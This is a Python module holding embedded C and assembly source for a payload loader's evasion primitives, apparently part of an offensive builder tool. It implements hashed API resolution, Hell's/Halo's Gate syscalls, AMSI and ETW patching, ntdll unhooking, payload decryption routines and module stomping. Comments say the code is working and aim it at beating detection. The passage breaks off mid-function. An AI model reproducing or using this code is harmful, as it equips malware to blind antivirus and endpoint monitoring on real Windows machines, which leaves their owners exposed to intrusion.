"""
cstubs.py — embedded C source for the evasion primitives.

Every string here is real, working C targeting mingw-w64 (x86_64-w64-mingw32).
The assembler picks the pieces it needs based on the technique + evasion flags.

Contents
--------
HEADERS            common includes + typedefs used everywhere
DYNAMIC_API        PEB walk + ROR13 hash resolver (defeats IAT/static analysis)
SYSCALLS_C         SSN resolver (Hell's Gate) + indirect-syscall gadget locator
SYSCALLS_ASM       the syscall stubs themselves (gas / .intel_syntax)
AMSI_ETW           runtime patching of amsi.dll!AmsiScanBuffer + ntdll!EtwEventWrite
UNHOOK             map a fresh ntdll from disk and overwrite the hooked .text
RC4                tiny in-process RC4 (decrypt-at-execution of the payload)
XOR                single-key XOR decrypt
HELPERS            small utilities (find process id by name, etc.)
"""

# ---------------------------------------------------------------------------
# Common headers / typedefs
# ---------------------------------------------------------------------------
HEADERS = r"""
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>

typedef LONG NTSTATUS;
typedef NTSTATUS (NTAPI *fnNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, SIZE_T*, ULONG, ULONG);
typedef NTSTATUS (NTAPI *fnNtProtectVirtualMemory)(HANDLE, PVOID*, SIZE_T*, ULONG, ULONG*);
typedef NTSTATUS (NTAPI *fnNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, SIZE_T*);
typedef NTSTATUS (NTAPI *fnNtCreateThreadEx)(HANDLE*, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI *fnNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI *fnNtOpenProcess)(PHANDLE, ACCESS_MASK, PVOID, PVOID);
typedef NTSTATUS (NTAPI *fnNtWaitForSingleObject)(HANDLE, BOOLEAN, PLARGE_INTEGER);

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)
#endif
"""

# ---------------------------------------------------------------------------
# Dynamic API resolution: PEB walk + hash (no suspicious IAT/strings).
# The hash is swappable (ROR13 or FNV-1a) — see HASH_* blocks below.
# ---------------------------------------------------------------------------
DYNAMIC_API = r"""
/* ---- minimal PEB / Ldr structures (x64) ---- */
typedef struct _MY_PEB_LDR_DATA {
    ULONG   Length;
    BOOLEAN Initialized;
    PVOID   SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} MY_PEB_LDR_DATA;

typedef struct _MY_LDR_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_LDR_ENTRY;

/* PEB.Ldr lives at PEB + 0x18 on x64 */
static MY_PEB_LDR_DATA* peb_ldr(void) {
#if defined(_M_X64) || defined(__x86_64__)
    const ULONG_PTR peb = (ULONG_PTR)__readgsqword(0x60);
    return (MY_PEB_LDR_DATA*)(*(ULONG_PTR*)(peb + 0x18));
#else
    const ULONG_PTR peb = (ULONG_PTR)__readfsdword(0x30);
    return (MY_PEB_LDR_DATA*)(*(ULONG_PTR*)(peb + 0x0c));
#endif
}

/* resolve an export address by module-hash + function-hash, walking the PEB */
static FARPROC dyn_resolve(DWORD mod_hash, DWORD fn_hash) {
    MY_PEB_LDR_DATA* ldr = peb_ldr();
    if (!ldr) return NULL;
    LIST_ENTRY* head = &ldr->InLoadOrderModuleList;
    for (LIST_ENTRY* p = head->Flink; p && p != head; p = p->Flink) {
        MY_LDR_ENTRY* e = (MY_LDR_ENTRY*)p;
        if (!e->BaseDllName.Buffer) continue;
        if (hash_wide(e->BaseDllName.Buffer) != mod_hash) continue;

        BYTE* base = (BYTE*)e->DllBase;
        IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) break;
        IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
        IMAGE_DATA_DIRECTORY* ed = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (!ed->VirtualAddress) return NULL;
        IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + ed->VirtualAddress);
        DWORD* funcs = (DWORD*)(base + exp->AddressOfFunctions);
        DWORD* names = (DWORD*)(base + exp->AddressOfNames);
        WORD*  ords  = (WORD*) (base + exp->AddressOfNameOrdinals);
        for (DWORD i = 0; i < exp->NumberOfNames; i++) {
            const char* nm = (const char*)(base + names[i]);
            if (hash_ascii(nm) == fn_hash)
                return (FARPROC)(base + funcs[ords[i]]);
        }
        return NULL;
    }
    return NULL;
}
"""

# hash function variants — pick one before DYNAMIC_API so dyn_resolve links.
HASH_ROR13 = r"""
static DWORD ror13_dword(DWORD v) { return (v >> 13) | (v << 19); }
static DWORD hash_ascii(const char* s) {
    DWORD h = 0;
    while (*s) { h = ror13_dword(h) + (unsigned char)*s; s++; }
    return h;
}
static DWORD hash_wide(const wchar_t* s) {
    DWORD h = 0;
    while (*s) {
        wchar_t c = *s;
        if (c >= L'A' && c <= L'Z') c += (wchar_t)32;
        h = ror13_dword(h) + (DWORD)c;
        s++;
    }
    return h;
}
"""

HASH_FNV = r"""
/* FNV-1a 32-bit — far less signatured than ROR13 in detection rules */
static DWORD hash_ascii(const char* s) {
    DWORD h = 0x811c9dc5u;
    while (*s) { h ^= (unsigned char)*s; h *= 0x01000193u; s++; }
    return h;
}
static DWORD hash_wide(const wchar_t* s) {
    DWORD h = 0x811c9dc5u;
    while (*s) {
        wchar_t c = *s;
        if (c >= L'A' && c <= L'Z') c += (wchar_t)32;
        h ^= (DWORD)c; h *= 0x01000193u; s++;
    }
    return h;
}
"""

# ---------------------------------------------------------------------------
# Syscalls: Hell's Gate SSN resolution + indirect-syscall gadget locator.
# Used by the direct/indirect syscall evasion layers and by pe23/pe24/pe25.
# ---------------------------------------------------------------------------
SYSCALLS_C = r"""
#include <intrin.h>

typedef struct _SYSCALL_ENTRY {
    DWORD  ssn;        /* syscall service number */
    void*  gadget;     /* address of a `syscall; ret` inside ntdll (indirect) */
} SYSCALL_ENTRY;

/* globals the asm stub reads */
DWORD  g_ssn = 0;
void*  g_syscall_addr = NULL;

static void* ntdll_base(void) {
    /* find ntdll via the PEB InLoadOrder list (hash_wide lives in dynamic-api block,
       but we provide a tiny name-based fallback here too so this file is self-sufficient) */
    const ULONG_PTR peb = (ULONG_PTR)__readgsqword(0x60);
    ULONG_PTR ldr = *(ULONG_PTR*)(peb + 0x18);
    LIST_ENTRY* head = (LIST_ENTRY*)(ldr + 0x10);
    for (LIST_ENTRY* p = head->Flink; p != head; p = p->Flink) {
        /* MY_LDR_ENTRY: DllBase @ +0x30, BaseDllName.Buffer @ +0x60 */
        void* base = *(void**)((BYTE*)p + 0x30);
        wchar_t* buf = *(wchar_t**)((BYTE*)p + 0x60);
        if (!buf) continue;
        if (buf[0] == L'n' && buf[1] == L't' && buf[2] == L'd' &&
            buf[3] == L'l' && buf[4] == L'l' && buf[5] == L'.') {
            return base;
        }
    }
    return NULL;
}

/* Hell's Gate: read `mov r10,rcx ; mov eax,<ssn>` (4c 8b d1 b8 SSN..) off the stub */
static BOOL resolve_ssn(const char* func, SYSCALL_ENTRY* out) {
    void* nt = ntdll_base();
    if (!nt) return FALSE;
    BYTE* base = (BYTE*)nt;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt_hdr = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY* ed = &nt_hdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!ed->VirtualAddress) return FALSE;
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + ed->VirtualAddress);
    DWORD* funcs = (DWORD*)(base + exp->AddressOfFunctions);
    DWORD* names = (DWORD*)(base + exp->AddressOfNames);
    WORD*  ords  = (WORD*) (base + exp->AddressOfNameOrdinals);

    void* fn_addr = NULL;
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char* nm = (const char*)(base + names[i]);
        if (strcmp(nm, func) == 0) { fn_addr = (void*)(base + funcs[ords[i]]); break; }
    }
    if (!fn_addr) return FALSE;

    BYTE* stub = (BYTE*)fn_addr;
    /* unhooked stub:  4c 8b d1          mov r10, rcx
                       b8 SSN SSN 00 00  mov eax, <ssn>        */
    if (stub[0] == 0x4c && stub[1] == 0x8b && stub[2] == 0xd1 && stub[3] == 0xb8) {
        out->ssn = *(DWORD*)(stub + 4);
    } else {
        /* Halo's Gate: a hooked stub is patched with jmps — walk neighbours
           counting distance to the nearest clean stub. */
        for (int i = 1; i < 500; i++) {
            BYTE* up = stub - (i * 32);
            BYTE* dn = stub + (i * 32);
            if (up[0] == 0x4c && up[1] == 0x8b && up[2] == 0xd1 && up[3] == 0xb8) {
                out->ssn = *(DWORD*)(up + 4) + (DWORD)i; break;
            }
            if (dn[0] == 0x4c && dn[1] == 0x8b && dn[2] == 0xd1 && dn[3] == 0xb8) {
                out->ssn = *(DWORD*)(dn + 4) - (DWORD)i; break;
            }
        }
        if (!out->ssn) return FALSE;
    }

    /* locate a `syscall; ret` (0f 05 c3) gadget inside ntdll .text for indirect mode */
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt_hdr);
    for (WORD i = 0; i < nt_hdr->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            BYTE* p   = base + sec[i].VirtualAddress;
            DWORD len = sec[i].Misc.VirtualSize;
            for (DWORD k = 0; k + 2 < len; k++) {
                if (p[k] == 0x0f && p[k+1] == 0x05 && p[k+2] == 0xc3) {
                    out->gadget = (void*)(p + k);
                    return TRUE;
                }
            }
            break;
        }
    }
    out->gadget = NULL;
    return out->ssn ? TRUE : FALSE;
}
"""

SYSCALLS_ASM = r"""
.intel_syntax noprefix
.text

/* Direct syscall:  mov r10,rcx ; mov eax,[g_ssn] ; syscall ; ret
   Caller fills g_ssn, then invokes with the syscall's native arg0 in RCX. */
.globl DoDirectSyscall
DoDirectSyscall:
    mov  r10, rcx
    mov  eax, DWORD PTR [rip + g_ssn]
    syscall
    ret

/* Indirect syscall: jump to the `syscall; ret` gadget inside ntdll so the
   return address originates from ntdll, not from our module. */
.globl DoIndirectSyscall
DoIndirectSyscall:
    mov  r10, rcx
    mov  eax, DWORD PTR [rip + g_ssn]
    jmp  QWORD PTR [rip + g_syscall_addr]
"""

# ---------------------------------------------------------------------------
# AMSI + ETW runtime patching
# ---------------------------------------------------------------------------
AMSI_ETW = r"""
static BOOL patch_function(BYTE* fn) {
    if (!fn) return FALSE;
    DWORD old = 0;
    if (!VirtualProtect(fn, 16, PAGE_EXECUTE_READWRITE, &old)) return FALSE;
    fn[0] = 0xB8; fn[1] = 0x57; fn[2] = 0x00; fn[3] = 0x07; fn[4] = 0x80; /* mov eax, 0x80070057 */
    fn[5] = 0xC3;                                                          /* ret            */
    VirtualProtect(fn, 16, old, &old);
    return TRUE;
}

static void neutralize_etw(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    FARPROC ew = GetProcAddress(ntdll, "EtwEventWrite");
    if (ew) {
        DWORD old = 0;
        if (VirtualProtect((void*)ew, 4, PAGE_EXECUTE_READWRITE, &old)) {
            ((BYTE*)ew)[0] = 0xC3; /* ret immediately */
            VirtualProtect((void*)ew, 4, old, &old);
        }
    }
}

static void neutralize_amsi(void) {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return;
    FARPROC asb = GetProcAddress(amsi, "AmsiScanBuffer");
    patch_function((BYTE*)asb);
}
"""

# ---------------------------------------------------------------------------
# ntdll unhook: copy a clean .text over the in-memory ntdll
# ---------------------------------------------------------------------------
UNHOOK = r"""
static void unhook_ntdll(void) {
    HMODULE h = GetModuleHandleA("ntdll.dll");
    if (!h) return;
    BYTE* current = (BYTE*)h;

    /* open a fresh copy from disk */
    HANDLE fh = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
                            GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, 0, NULL);
    if (fh == INVALID_HANDLE_VALUE) return;

    LARGE_INTEGER sz; sz.QuadPart = 0;
    GetFileSizeEx(fh, &sz);
    BYTE* raw = (BYTE*)malloc((SIZE_T)sz.QuadPart);
    if (!raw) { CloseHandle(fh); return; }
    DWORD got = 0;
    if (!ReadFile(fh, raw, (DWORD)sz.QuadPart, &got, NULL)) { free(raw); CloseHandle(fh); return; }
    CloseHandle(fh);

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)raw;
    IMAGE_NT_HEADERS* nt  = (IMAGE_NT_HEADERS*)(raw + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            void* dst = current + sec[i].VirtualAddress;
            void* src = raw + sec[i].PointerToRawData;
            DWORD len = sec[i].Misc.VirtualSize;
            DWORD old = 0;
            if (VirtualProtect(dst, len, PAGE_EXECUTE_READWRITE, &old)) {
                memcpy(dst, src, len);
                VirtualProtect(dst, len, old, &old);
            }
            break;
        }
    }
    free(raw);
}
"""

# ---------------------------------------------------------------------------
# In-process decrypt routines
# ---------------------------------------------------------------------------
RC4 = r"""
static void rc4_decrypt(unsigned char* data, unsigned int len, const unsigned char* key, unsigned int klen) {
    unsigned char S[256];
    for (int i = 0; i < 256; i++) S[i] = (unsigned char)i;
    unsigned int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % klen]) & 0xFF;
        unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
    }
    unsigned int a = 0, b = 0;
    for (unsigned int n = 0; n < len; n++) {
        a = (a + 1) & 0xFF;
        b = (b + S[a]) & 0xFF;
        unsigned char t = S[a]; S[a] = S[b]; S[b] = t;
        data[n] ^= S[(S[a] + S[b]) & 0xFF];
    }
}
"""

XOR = r"""
static void xor_decrypt(unsigned char* data, unsigned int len, const unsigned char* key, unsigned int klen) {
    for (unsigned int i = 0; i < len; i++)
        data[i] ^= key[i % klen];
}
"""

# ---------------------------------------------------------------------------
# AES-256-CBC — verified against pycryptodome (FIPS-197 vector + 20 random
# round-trips). Adapted from public-domain kokke/tiny-AES-c (AES-256, decrypt).
# ---------------------------------------------------------------------------
AES = r"""
/* AES-256-CBC decrypt (compact). Forward sbox in key-expansion, inverse in cipher. */
#define AES_BLOCKLEN 16
#define AES_KEYLEN   32
#define AES_Nk       8
#define AES_Nr       14
#define AES_keyExpSize 240
struct aes_ctx { uint8_t round_key[AES_keyExpSize]; };
static const uint8_t aes_sbox[256] = {
0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16
};
static const uint8_t aes_rsbox[256] = {
0x52,0x09,0x6a,0xd5,0x30,0x36,0xa5,0x38,0xbf,0x40,0xa3,0x9e,0x81,0xf3,0xd7,0xfb,
0x7c,0xe3,0x39,0x82,0x9b,0x2f,0xff,0x87,0x34,0x8e,0x43,0x44,0xc4,0xde,0xe9,0xcb,
0x54,0x7b,0x94,0x32,0xa6,0xc2,0x23,0x3d,0xee,0x4c,0x95,0x0b,0x42,0xfa,0xc3,0x4e,
0x08,0x2e,0xa1,0x66,0x28,0xd9,0x24,0xb2,0x76,0x5b,0xa2,0x49,0x6d,0x8b,0xd1,0x25,
0x72,0xf8,0xf6,0x64,0x86,0x68,0x98,0x16,0xd4,0xa4,0x5c,0xcc,0x5d,0x65,0xb6,0x92,
0x6c,0x70,0x48,0x50,0xfd,0xed,0xb9,0xda,0x5e,0x15,0x46,0x57,0xa7,0x8d,0x9d,0x84,
0x90,0xd8,0xab,0x00,0x8c,0xbc,0xd3,0x0a,0xf7,0xe4,0x58,0x05,0xb8,0xb3,0x45,0x06,
0xd0,0x2c,0x1e,0x8f,0xca,0x3f,0x0f,0x02,0xc1,0xaf,0xbd,0x03,0x01,0x13,0x8a,0x6b,
0x3a,0x91,0x11,0x41,0x4f,0x67,0xdc,0xea,0x97,0xf2,0xcf,0xce,0xf0,0xb4,0xe6,0x73,
0x96,0xac,0x74,0x22,0xe7,0xad,0x35,0x85,0xe2,0xf9,0x37,0xe8,0x1c,0x75,0xdf,0x6e,
0x47,0xf1,0x1a,0x71,0x1d,0x29,0xc5,0x89,0x6f,0xb7,0x62,0x0e,0xaa,0x18,0xbe,0x1b,
0xfc,0x56,0x3e,0x4b,0xc6,0xd2,0x79,0x20,0x9a,0xdb,0xc0,0xfe,0x78,0xcd,0x5a,0xf4,
0x1f,0xdd,0xa8,0x33,0x88,0x07,0xc7,0x31,0xb1,0x12,0x10,0x59,0x27,0x80,0xec,0x5f,
0x60,0x51,0x7f,0xa9,0x19,0xb5,0x4a,0x0d,0x2d,0xe5,0x7a,0x9f,0x93,0xc9,0x9c,0xef,
0xa0,0xe0,0x3b,0x4d,0xae,0x2a,0xf5,0xb0,0xc8,0xeb,0xbb,0x3c,0x83,0x53,0x99,0x61,
0x17,0x2b,0x04,0x7e,0xba,0x77,0xd6,0x26,0xe1,0x69,0x14,0x63,0x55,0x21,0x0c,0x7d
};
static const uint8_t aes_rcon[11] = {0x00,0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36};
static uint8_t aes_gmul(uint8_t a, uint8_t b) {
    uint8_t p = 0;
    for (int i = 0; i < 8; i++) {
        if (b & 1) p ^= a;
        uint8_t hi = a & 0x80; a <<= 1; if (hi) a ^= 0x1b; b >>= 1;
    }
    return p;
}
static void aes_key_expansion(struct aes_ctx* ctx, const uint8_t* key) {
    uint8_t temp[4]; unsigned i = 0;
    memcpy(ctx->round_key, key, AES_KEYLEN);
    for (i = AES_Nk; i < 4 * (AES_Nr + 1); ++i) {
        temp[0]=ctx->round_key[(i-1)*4+0]; temp[1]=ctx->round_key[(i-1)*4+1];
        temp[2]=ctx->round_key[(i-1)*4+2]; temp[3]=ctx->round_key[(i-1)*4+3];
        if (i % AES_Nk == 0) {
            uint8_t t = temp[0]; temp[0]=temp[1]; temp[1]=temp[2]; temp[2]=temp[3]; temp[3]=t;
            temp[0]=aes_sbox[temp[0]]; temp[1]=aes_sbox[temp[1]]; temp[2]=aes_sbox[temp[2]]; temp[3]=aes_sbox[temp[3]];
            temp[0] ^= aes_rcon[i / AES_Nk];
        } else if (AES_Nk > 6 && i % AES_Nk == 4) {
            temp[0]=aes_sbox[temp[0]]; temp[1]=aes_sbox[temp[1]]; temp[2]=aes_sbox[temp[2]]; temp[3]=aes_sbox[temp[3]];
        }
        ctx->round_key[i*4+0]=ctx->round_key[(i-AES_Nk)*4+0]^temp[0];
        ctx->round_key[i*4+1]=ctx->round_key[(i-AES_Nk)*4+1]^temp[1];
        ctx->round_key[i*4+2]=ctx->round_key[(i-AES_Nk)*4+2]^temp[2];
        ctx->round_key[i*4+3]=ctx->round_key[(i-AES_Nk)*4+3]^temp[3];
    }
}
static void aes_add_round_key(struct aes_ctx* ctx, uint8_t s[][4], uint8_t round) {
    for (int i=0;i<4;++i) for (int j=0;j<4;++j) s[j][i] ^= ctx->round_key[round*16+i*4+j];
}
static void aes_inv_sub_bytes(uint8_t s[][4]) {
    for (int i=0;i<4;++i) for (int j=0;j<4;++j) s[j][i] = aes_rsbox[s[j][i]];
}
static void aes_inv_shift_rows(uint8_t s[][4]) {
    uint8_t t;
    t=s[1][3]; s[1][3]=s[1][2]; s[1][2]=s[1][1]; s[1][1]=s[1][0]; s[1][0]=t;
    t=s[2][0]; s[2][0]=s[2][2]; s[2][2]=t; t=s[2][1]; s[2][1]=s[2][3]; s[2][3]=t;
    t=s[3][0]; s[3][0]=s[3][1]; s[3][1]=s[3][2]; s[3][2]=s[3][3]; s[3][3]=t;
}
static void aes_inv_mix_columns(uint8_t s[][4]) {
    for (int i=0;i<4;++i) {
        uint8_t a0=s[0][i],a1=s[1][i],a2=s[2][i],a3=s[3][i];
        s[0][i]=aes_gmul(a0,14)^aes_gmul(a1,11)^aes_gmul(a2,13)^aes_gmul(a3,9);
        s[1][i]=aes_gmul(a0,9) ^aes_gmul(a1,14)^aes_gmul(a2,11)^aes_gmul(a3,13);
        s[2][i]=aes_gmul(a0,13)^aes_gmul(a1,9) ^aes_gmul(a2,14)^aes_gmul(a3,11);
        s[3][i]=aes_gmul(a0,11)^aes_gmul(a1,13)^aes_gmul(a2,9) ^aes_gmul(a3,14);
    }
}
static void aes_inv_cipher(struct aes_ctx* ctx, uint8_t* buf) {
    uint8_t s[4][4];
    for (int i=0;i<4;++i) for (int j=0;j<4;++j) s[j][i] = buf[i*4+j];
    aes_add_round_key(ctx, s, AES_Nr);
    for (uint8_t round=(AES_Nr-1); round>0; --round) {
        aes_inv_shift_rows(s); aes_inv_sub_bytes(s);
        aes_add_round_key(ctx, s, round); aes_inv_mix_columns(s);
    }
    aes_inv_shift_rows(s); aes_inv_sub_bytes(s); aes_add_round_key(ctx, s, 0);
    for (int i=0;i<4;++i) for (int j=0;j<4;++j) buf[i*4+j] = s[j][i];
}
/* CBC decrypt in place; iv is the 16-byte IV. Payload is PKCS7-padded by the
   generator; trailing pad bytes are harmless (execution never reaches them). */
static void aes256_cbc_decrypt(struct aes_ctx* ctx, uint8_t* buf, size_t len, const uint8_t* iv) {
    uint8_t prev[AES_BLOCKLEN], cur[AES_BLOCKLEN];
    memcpy(prev, iv, AES_BLOCKLEN);
    for (size_t off=0; off+AES_BLOCKLEN<=len; off+=AES_BLOCKLEN) {
        memcpy(cur, buf+off, AES_BLOCKLEN);
        aes_inv_cipher(ctx, buf+off);
        for (int i=0;i<AES_BLOCKLEN;++i) buf[off+i] ^= prev[i];
        memcpy(prev, cur, AES_BLOCKLEN);
    }
}
static void aes256_init(struct aes_ctx* ctx, const uint8_t* key32) { aes_key_expansion(ctx, key32); }
"""

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
HELPERS = r"""
/* find the PID of the first process matching `name` (case-insensitive). */
static int shroud_wieq(const wchar_t* a, const wchar_t* b) {
    while (*a && *b) {
        wchar_t x = *a, y = *b;
        if (x >= L'A' && x <= L'Z') x += 32;
        if (y >= L'A' && y <= L'Z') y += 32;
        if (x != y) return 0;
        a++; b++;
    }
    return *a == 0 && *b == 0;
}
__attribute__((unused))
static DWORD pid_by_name(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    wchar_t wname[260]; int n = 0;
    for (; name[n] && n < 259; n++) wname[n] = (wchar_t)(unsigned char)name[n];
    wname[n] = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (shroud_wieq(wname, pe.szExeFile)) { pid = pe.th32ProcessID; break; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}
"""

# ---------------------------------------------------------------------------
# MODULE STOMPING — back the payload with a legitimate module's image so it
# passes "unbacked/anonymous executable memory" checks. Loads a legit DLL,
# overwrites its .text with the payload, returns a pointer into the (file-backed,
# RX) region. The DLL's own code is never called, so breaking it is harmless.
# ---------------------------------------------------------------------------
MODULE_STOMP = r"""
static void* shroud_stage_stomp(const void* sc, unsigned int len, const char* dll) {
    HMODULE h = LoadLibraryA(dll);
    if (!h) return NULL;
    BYTE* base = (BYTE*)h;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            void*  text  = base + sec[i].VirtualAddress;
            DWORD  tsize = sec[i].Misc.VirtualSize;
            if (tsize < len) return NULL;
            DWORD old = 0;
            if (!VirtualProtect(text, tsize, PAGE_READWRITE, &old)) return NULL;
            memcpy(text, sc, len);
            DWORD old2 = 0;
            VirtualProtect(text, tsize, PAGE_EXECUTE_READ, &old2);
            FlushInstructionCache(GetCurrentProcess(), text, len);
            return text;
        }
    }
    return NULL;
}
"""

# ---------------------------------------------------------------------------
# KNOWNDLLS UNHOOK — overwrite hooked ntdll .text with a clean copy mapped from
# \KnownDlls\ntdll.dll (no disk read -> defeats the CreateFile(System32\ntdll.dll)
# telemetry that the basic -e unhook layer trips).
# ---------------------------------------------------------------------------
KNOWNDLLS_UNHOOK = r"""
typedef LONG (NTAPI *tNtOpenSection)(PHANDLE, ACCESS_MASK, void*);
typedef LONG (NTAPI *tNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);

static void unhook_ntdll_knowndlls(void) {
    HMODULE nt = GetModuleHandleA("ntdll.dll");
    if (!nt) return;
    BYTE* current = (BYTE*)nt;
    tNtOpenSection       pOpen = (tNtOpenSection)GetProcAddress(nt, "NtOpenSection");
    tNtMapViewOfSection  pMap  = (tNtMapViewOfSection)GetProcAddress(nt, "NtMapViewOfSection");
    if (!pOpen || !pMap) return;

    typedef struct { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } KS_US;
    typedef struct { ULONG Length; HANDLE RootDirectory; KS_US* ObjectName; ULONG Attributes; PVOID SD; PVOID SQS; } KS_OA;
    wchar_t nm[] = L"\\KnownDlls\\ntdll.dll";
    KS_US us; us.Buffer = nm; us.Length = (USHORT)(wcslen(nm) * 2); us.MaximumLength = (USHORT)(us.Length + 2);
    KS_OA oa; oa.Length = sizeof(oa); oa.RootDirectory = NULL; oa.ObjectName = &us;
    oa.Attributes = 0x40 /* OBJ_CASE_INSENSITIVE */; oa.SD = NULL; oa.SQS = NULL;

    HANDLE sec = NULL;
    if (pOpen(&sec, 0x000F001F /* SECTION_ALL_ACCESS */, &oa) || !sec) return;

    PVOID base = NULL; SIZE_T viewsize = 0;
    if (pMap(sec, (HANDLE)(ULONG_PTR)-1, &base, 0, 0, NULL, &viewsize, 1, 0, PAGE_READONLY) || !base) return;

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nh  = (IMAGE_NT_HEADERS*)((BYTE*)base + dos->e_lfanew);
    IMAGE_SECTION_HEADER* s = IMAGE_FIRST_SECTION(nh);
    for (WORD i = 0; i < nh->FileHeader.NumberOfSections; i++) {
        if (memcmp(s[i].Name, ".text", 5) == 0) {
            void* dst = current + s[i].VirtualAddress;
            void* src = (BYTE*)base + s[i].VirtualAddress;
            DWORD len = s[i].Misc.VirtualSize;
            DWORD old = 0;
            if (VirtualProtect(dst, len, PAGE_EXECUTE_READWRITE, &old)) {
                memcpy(dst, src, len);
                VirtualProtect(dst, len, old, &old);
